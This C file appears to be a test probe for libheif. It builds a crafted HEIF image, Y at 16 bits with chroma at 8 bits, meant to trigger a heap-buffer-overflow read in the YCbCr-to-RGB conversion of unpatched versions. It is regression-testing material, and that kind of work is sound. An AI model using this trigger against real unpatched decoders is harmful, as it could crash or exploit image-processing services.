/*
  Probe: decode a hand-built HEIF file holding a single uncompressed ('unci')
  YCbCr 4:2:0 image whose components declare different bit depths
  (Y = 16 bit, Cb = 8 bit, Cr = 8 bit) and request a 16-bit interleaved RGB
  conversion through the public libheif API.

  The file is structurally valid and every field is in contract: ISO/IEC
  23001-17 allows a bit depth per component, and heif_decode_image() with an
  interleaved 16-bit RGB target is a normal decode request.

  Expected result on a correct library: heif_decode_image() refuses the
  conversion cleanly (heif_error_Unsupported_feature) and the probe exits 0.
  On the defective tree the YCbCr420 -> RRGGBB conversion runs on the
  mismatched planes and reads the 1-byte-per-sample chroma planes through a
  uint16_t pointer, past the end of the allocations (heap-buffer-overflow READ),
  which AddressSanitizer reports and aborts on.
*/

#include <libheif/heif.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Have AddressSanitizer terminate the process with SIGABRT (rc 134) when it
   reports the fault, instead of its default plain exit. */
const char* __asan_default_options(void)
{
  return "abort_on_error=1";
}

#define WIDTH 512
#define HEIGHT 512
#define CHROMA_WIDTH (WIDTH / 2)
#define CHROMA_HEIGHT (HEIGHT / 2)

struct buf {
  uint8_t* data;
  size_t len;
  size_t cap;
};

static void buf_reserve(struct buf* b, size_t extra)
{
  if (b->len + extra > b->cap) {
    size_t cap = b->cap ? b->cap : 256;
    while (cap < b->len + extra)
      cap *= 2;
    b->data = (uint8_t*)realloc(b->data, cap);
    if (!b->data) {
      fprintf(stderr, "out of memory\n");
      exit(2);
    }
    b->cap = cap;
  }
}

static void put8(struct buf* b, uint8_t v)
{
  buf_reserve(b, 1);
  b->data[b->len++] = v;
}

static void put16(struct buf* b, uint16_t v)
{
  put8(b, (uint8_t)(v >> 8));
  put8(b, (uint8_t)v);
}

static void put32(struct buf* b, uint32_t v)
{
  put8(b, (uint8_t)(v >> 24));
  put8(b, (uint8_t)(v >> 16));
  put8(b, (uint8_t)(v >> 8));
  put8(b, (uint8_t)v);
}

static void put_fourcc(struct buf* b, const char* s)
{
  put8(b, (uint8_t)s[0]);
  put8(b, (uint8_t)s[1]);
  put8(b, (uint8_t)s[2]);
  put8(b, (uint8_t)s[3]);
}

static void append(struct buf* dst, const struct buf* src)
{
  buf_reserve(dst, src->len);
  memcpy(dst->data + dst->len, src->data, src->len);
  dst->len += src->len;
}

/* Wrap a payload in a box: [uint32 size][fourcc type][payload]. */
static struct buf box(const char* type, const struct buf* payload)
{
  struct buf b = {NULL, 0, 0};
  put32(&b, (uint32_t)(8 + payload->len));
  put_fourcc(&b, type);
  append(&b, payload);
  return b;
}

/* Wrap a payload in a full box: box header + version byte + 3 flags bytes. */
static struct buf full_box(const char* type, const struct buf* payload, uint8_t version)
{
  struct buf inner = {NULL, 0, 0};
  put8(&inner, version);
  put8(&inner, 0);
  put8(&inner, 0);
  put8(&inner, 0);
  append(&inner, payload);
  struct buf b = box(type, &inner);
  free(inner.data);
  return b;
}

/* The uncompressed tile data: the 16-bit luma plane (row-major, big-endian),
   then the mixed-interleaved chroma block (one Cb byte and one Cr byte per
   chroma position). */
static struct buf build_tile_data(void)
{
  struct buf t = {NULL, 0, 0};
  uint32_t x, y;
  for (y = 0; y < HEIGHT; y++)
    for (x = 0; x < WIDTH; x++)
      put16(&t, (uint16_t)(0x1000 + x + WIDTH * y));
  for (y = 0; y < CHROMA_HEIGHT; y++)
    for (x = 0; x < CHROMA_WIDTH; x++) {
      put8(&t, (uint8_t)(0x40 + y * CHROMA_WIDTH + x)); /* Cb */
      put8(&t, (uint8_t)(0x80 + y * CHROMA_WIDTH + x)); /* Cr */
    }
  return t;
}

static struct buf build_file(void)
{
  static const uint8_t depths[3] = {16, 8, 8}; /* Y, Cb, Cr */
  uint16_t i;

  /* ftyp */
  struct buf ftyp_p = {NULL, 0, 0};
  put_fourcc(&ftyp_p, "mif1");
  put32(&ftyp_p, 0);
  put_fourcc(&ftyp_p, "mif1");
  put_fourcc(&ftyp_p, "heic");
  struct buf ftyp = box("ftyp", &ftyp_p);
  free(ftyp_p.data);

  /* hdlr */
  struct buf hdlr_p = {NULL, 0, 0};
  put32(&hdlr_p, 0);
  put_fourcc(&hdlr_p, "pict");
  put32(&hdlr_p, 0);
  put32(&hdlr_p, 0);
  put32(&hdlr_p, 0);
  put8(&hdlr_p, 0);
  struct buf hdlr = full_box("hdlr", &hdlr_p, 0);
  free(hdlr_p.data);

  /* pitm: primary item = 1 */
  struct buf pitm_p = {NULL, 0, 0};
  put16(&pitm_p, 1);
  struct buf pitm = full_box("pitm", &pitm_p, 0);
  free(pitm_p.data);

  /* iinf with one 'unci' infe (version 2) */
  struct buf infe_p = {NULL, 0, 0};
  put16(&infe_p, 1); /* item_ID */
  put16(&infe_p, 0); /* item_protection_index */
  put_fourcc(&infe_p, "unci");
  put8(&infe_p, 0); /* item_name */
  struct buf infe = full_box("infe", &infe_p, 2);
  free(infe_p.data);

  struct buf iinf_p = {NULL, 0, 0};
  put16(&iinf_p, 1);
  append(&iinf_p, &infe);
  free(infe.data);
  struct buf iinf = full_box("iinf", &iinf_p, 0);
  free(iinf_p.data);

  /* ispe */
  struct buf ispe_p = {NULL, 0, 0};
  put32(&ispe_p, WIDTH);
  put32(&ispe_p, HEIGHT);
  struct buf ispe = full_box("ispe", &ispe_p, 0);
  free(ispe_p.data);

  /* cmpd: components Y, Cb, Cr */
  struct buf cmpd_p = {NULL, 0, 0};
  put32(&cmpd_p, 3);
  put16(&cmpd_p, 1);
  put16(&cmpd_p, 2);
  put16(&cmpd_p, 3);
  struct buf cmpd = box("cmpd", &cmpd_p);
  free(cmpd_p.data);

  /* uncC (version 0): mixed interleave, 4:2:0, Y=16 bit, Cb=8 bit, Cr=8 bit */
  struct buf uncC_p = {NULL, 0, 0};
  put32(&uncC_p, 0); /* profile */
  put32(&uncC_p, 3); /* component_count */
  for (i = 0; i < 3; i++) {
    put16(&uncC_p, i);               /* component_index */
    put8(&uncC_p, (uint8_t)(depths[i] - 1)); /* component_bit_depth_minus_one */
    put8(&uncC_p, 0);                /* component_format (unsigned) */
    put8(&uncC_p, 0);                /* component_align_size */
  }
  put8(&uncC_p, 2);  /* sampling_type = 4:2:0 */
  put8(&uncC_p, 2);  /* interleave_type = mixed */
  put8(&uncC_p, 0);  /* block_size */
  put8(&uncC_p, 0);  /* flags */
  put32(&uncC_p, 0); /* pixel_size */
  put32(&uncC_p, 0); /* row_align_size */
  put32(&uncC_p, 0); /* tile_align_size */
  put32(&uncC_p, 0); /* num_tile_cols_minus_one */
  put32(&uncC_p, 0); /* num_tile_rows_minus_one */
  struct buf uncC = full_box("uncC", &uncC_p, 0);
  free(uncC_p.data);

  /* colr (nclx): BT.601 matrix, full range, so the YCbCr->RGB operators apply */
  struct buf colr_p = {NULL, 0, 0};
  put_fourcc(&colr_p, "nclx");
  put16(&colr_p, 6); /* colour_primaries */
  put16(&colr_p, 6); /* transfer_characteristics */
  put16(&colr_p, 6); /* matrix_coefficients */
  put8(&colr_p, 0x80); /* full_range_flag */
  struct buf colr = box("colr", &colr_p);
  free(colr_p.data);

  /* ipco */
  struct buf ipco_p = {NULL, 0, 0};
  append(&ipco_p, &ispe);
  append(&ipco_p, &cmpd);
  append(&ipco_p, &uncC);
  append(&ipco_p, &colr);
  free(ispe.data);
  free(cmpd.data);
  free(uncC.data);
  free(colr.data);
  struct buf ipco = box("ipco", &ipco_p);
  free(ipco_p.data);

  /* ipma: item 1 -> ispe (essential), cmpd (essential), uncC (essential), colr */
  struct buf ipma_p = {NULL, 0, 0};
  put32(&ipma_p, 1); /* entry_count */
  put16(&ipma_p, 1); /* item_ID */
  put8(&ipma_p, 4);  /* association_count */
  put8(&ipma_p, 0x80 | 1);
  put8(&ipma_p, 0x80 | 2);
  put8(&ipma_p, 0x80 | 3);
  put8(&ipma_p, 4);
  struct buf ipma = full_box("ipma", &ipma_p, 0);
  free(ipma_p.data);

  /* iprp */
  struct buf iprp_p = {NULL, 0, 0};
  append(&iprp_p, &ipco);
  append(&iprp_p, &ipma);
  free(ipco.data);
  free(ipma.data);
  struct buf iprp = box("iprp", &iprp_p);
  free(iprp_p.data);

  /* idat with the tile data */
  struct buf tile = build_tile_data();
  struct buf idat = box("idat", &tile);

  /* iloc (version 1): item 1 lives in idat (construction_method = 1) */
  struct buf iloc_p = {NULL, 0, 0};
  put8(&iloc_p, (4 << 4) | 4); /* offset_size = 4, length_size = 4 */
  put8(&iloc_p, 0);            /* base_offset_size = 0, index_size = 0 */
  put16(&iloc_p, 1);           /* item_count */
  put16(&iloc_p, 1);           /* item_ID */
  put16(&iloc_p, 0x0001);      /* construction_method = 1 (idat) */
  put16(&iloc_p, 0);           /* data_reference_index */
  put16(&iloc_p, 1);           /* extent_count */
  put32(&iloc_p, 0);           /* extent_offset */
  put32(&iloc_p, (uint32_t)tile.len); /* extent_length */
  free(tile.data);
  struct buf iloc = full_box("iloc", &iloc_p, 1);
  free(iloc_p.data);

  /* meta */
  struct buf meta_p = {NULL, 0, 0};
  append(&meta_p, &hdlr);
  append(&meta_p, &pitm);
  append(&meta_p, &iinf);
  append(&meta_p, &iprp);
  append(&meta_p, &iloc);
  append(&meta_p, &idat);
  free(hdlr.data);
  free(pitm.data);
  free(iinf.data);
  free(iprp.data);
  free(iloc.data);
  free(idat.data);
  struct buf meta = full_box("meta", &meta_p, 0);
  free(meta_p.data);

  struct buf file = {NULL, 0, 0};
  append(&file, &ftyp);
  append(&file, &meta);
  free(ftyp.data);
  free(meta.data);
  return file;
}

int main(void)
{
  struct buf file = build_file();
  printf("probe: built %zu-byte 'unci' HEIF file (Y=16 bit, Cb=8 bit, Cr=8 bit)\n",
         file.len);

  heif_context* ctx = heif_context_alloc();
  if (!ctx) {
    fprintf(stderr, "heif_context_alloc failed\n");
    return 2;
  }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, file.data, file.len, NULL);
  if (err.code != heif_error_Ok) {
    printf("probe: heif_context_read_from_memory_without_copy: %s\n", err.message);
    heif_context_free(ctx);
    free(file.data);
    return 2;
  }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok || !handle) {
    printf("probe: heif_context_get_primary_image_handle: %s\n", err.message);
    heif_context_free(ctx);
    free(file.data);
    return 2;
  }

  /* Convert the mixed-depth YCbCr 4:2:0 image to 16-bit interleaved RGB.
     A correct library refuses this cleanly; the probe then exits 0. */
  heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_RGB,
                          heif_chroma_interleaved_RRGGBB_LE, NULL);
  printf("probe: heif_decode_image -> code=%d subcode=%d (%s)\n",
         err.code, err.subcode, err.message);

  if (img)
    heif_image_release(img);
  heif_image_handle_release(handle);
  heif_context_free(ctx);
  free(file.data);
  return 0;
}
